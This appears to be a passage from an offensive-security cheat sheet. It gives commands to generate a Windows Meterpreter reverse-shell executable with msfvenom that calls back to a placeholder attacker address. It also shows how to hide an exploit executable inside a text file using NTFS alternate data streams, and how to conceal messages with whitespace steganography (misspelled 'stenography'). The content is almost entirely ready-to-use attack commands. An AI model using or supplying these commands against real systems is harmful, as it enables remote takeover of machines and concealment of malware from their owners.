```bash
# Generate a reverse tcp payload for Windows
msfvenom -p windows/meterpreter/reverse_tcp --platform windows \
    -a x86 -o file.exe LHOST=YOUR_IP LPORT=YOUR_PORT
```

### NTFS Alternate Data Streams

NTFS streams are a feature of the NTFS file system that allows files to contain multiple streams of data.

This can be used to hide data within a file without altering its size or appearance.

```sh
# Create a file with an alternate data stream
echo "This is a hidden message" > file.txt:stream

# Insert a file as an alternate data stream
type exploit.exe > file.txt:file.exe
```

### White space stenography

White space stenography is the process of hiding data by using white space characters in a file.

```sh
snow -C -m "I am lying" -p "hello world" input.txt output.txt
```
